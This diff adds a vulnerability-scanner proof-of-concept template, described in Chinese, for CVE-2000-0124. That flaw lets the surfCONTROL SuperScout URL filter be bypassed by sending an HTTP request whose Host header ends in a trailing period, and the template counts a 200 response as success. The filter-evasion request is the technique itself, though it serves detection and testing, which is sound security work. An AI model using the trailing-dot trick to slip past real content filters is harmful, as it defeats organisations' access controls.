@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 surfCONTROL SuperScout 是否存在未正确对以英文句点（.）结尾网址进行类别分配的过滤绕过缺陷。通过对目标站点使用末尾带点的 Host（如 example.com.）发起 HTTP 请求，观察是否可正常访问本应被过滤系统拦截的受限站点内容，从而判断绕过是否成立。"
+id = "POC-AVE-2000-0113"
+name = "surfCONTROL SuperScout 网址过滤绕过漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-0113"]
+vuln_id = [
+    "CVE-2000-0124",
+    "AVE-2000-0113",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Host = "{{Hostname}}."
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
